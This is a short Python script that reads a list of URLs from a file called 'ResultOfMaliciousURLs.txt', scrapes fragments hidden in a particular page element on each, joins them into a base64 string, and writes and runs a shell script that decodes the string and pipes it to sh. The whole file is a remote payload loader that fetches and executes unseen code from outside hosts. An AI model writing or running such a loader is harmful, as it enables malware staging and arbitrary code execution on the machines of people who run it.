#!/bin/sh -c

import requests
from bs4 import BeautifulSoup
import re
import time
import os
import base64
import subprocess

regex1 = '<div class="PrDSKc">(.*?)</div>|$'
regex2 = '(?<=:).*$'
regex3 = '^([^:(]+?)(\s*[/])'
a = ""
with open('ResultOfMaliciousURLs.txt', 'r') as f:
    set_of_links = [re.sub(r'[(\[\],)]', '', x) for x in f.read().split()]
    
    #print(set_of_links[])
x=0
stringFoda = ""
twopoints=""
for x in range(len(set_of_links)):
        #print(out[x])
        time.sleep(0.3)
        requestt = requests.get(set_of_links[x])
        soup = BeautifulSoup(requestt.text, 'html.parser')
        base64 = soup.find("div", class_="PrDSKc")
        #print(base64)
        cleartex = re.findall(regex1,str(base64))
        lk=0
        for j in cleartex:
                twopoints = re.findall(regex2,str(j))
                #print(twopoints)
                xd=0

                for xd in range(len(twopoints)):
                        amem = twopoints[xd].split(" ")
                        stringFoda+= str(amem[1].replace("<br/>",""))
                        print(amem[1].replace("<br/>",""))

print(stringFoda)

f = open("exec.sh", "w")
f.write('cmd="base64 -d <<< %s | sh"\n' %str(stringFoda)) # + str(stringFoda) + "\nbash -c '$cmd'")
f.write('bash -c "$cmd"')
f.close()
os.system("chmod +x exec.sh")
os.system("./exec.sh")
